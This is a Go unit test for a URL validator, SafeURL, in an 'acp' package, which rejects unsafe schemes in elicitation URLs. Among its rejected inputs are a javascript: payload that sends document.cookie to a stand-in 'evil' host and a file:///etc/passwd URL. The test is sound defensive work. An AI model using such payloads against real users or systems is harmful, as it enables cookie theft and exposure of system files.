package acp

import "testing"

func TestCreateElicitationUrl_SafeURL(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		wantErr bool
	}{
		{"https", "https://example.com/auth", false},
		{"http for a local auth callback", "http://localhost:1234/auth", false},
		{"javascript scheme", "javascript:fetch('http://evil/'+document.cookie)", true},
		{"file scheme", "file:///etc/passwd", true},
		{"smb scheme", "smb://fileserver/share", true},
		{"custom app scheme", "vscode://vscode.git/clone?url=x", true},
		{"scheme-relative, no scheme", "//example.com/auth", true},
		{"https without a host", "https:///auth", true},
		{"empty", "", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := CreateElicitationUrl{Url: tc.url}.SafeURL()
			if tc.wantErr {
				if err == nil {
					t.Fatalf("SafeURL(%q) = %v, want an error", tc.url, got)
				}
				return
			}
			if err != nil {
				t.Fatalf("SafeURL(%q) returned %v, want no error", tc.url, err)
			}
			if got.String() != tc.url {
				t.Fatalf("SafeURL(%q) round-tripped to %q", tc.url, got.String())
			}
		})
	}
}
